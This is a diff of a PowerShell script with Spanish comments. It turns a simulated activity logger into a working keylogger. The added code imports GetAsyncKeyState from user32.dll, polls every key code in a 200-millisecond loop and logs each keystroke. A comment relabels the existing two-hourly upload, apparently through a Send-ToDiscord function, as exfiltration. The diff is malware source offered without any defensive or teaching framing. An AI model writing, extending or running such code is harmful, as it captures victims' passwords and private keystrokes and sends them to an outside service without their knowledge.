@@ -31,13 +31,30 @@ function Send-ToDiscord {
     }
 }
 
+# CARGAR DLL PARA CAPTURA DE TECLAS
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Keyboard {
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(int i);
+}
+"@
+
 # INICIAR LOOP INFINITO
 while ($true) {
-    # SIMULACIÓN DE CAPTURA DE EVENTO (puede ser keylog, etc.)
-    $fakeEvent = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Usuario activo"
-    Add-Content -Path $logFile -Value $fakeEvent
+    # CAPTURAR TECLAS
+    for ($i = 1; $i -le 255; $i++) {
+        $keyState = [Keyboard]::GetAsyncKeyState($i)
+        if ($keyState -eq -32767) {
+            $char = [char]$i
+            if ([char]::IsControl($char)) { $char = "[CTRL+$i]" }
+            $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $char"
+            Add-Content -Path $logFile -Value $log
+        }
+    }
 
-    # CADA 2 HORAS ENVÍA
+    # EXFILTRAR CADA 2 HORAS
     $now = Get-Date
     $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }
 
@@ -51,5 +68,5 @@ while ($true) {
         }
     }
 
-    Start-Sleep -Seconds 60
+    Start-Sleep -Milliseconds 200
 }
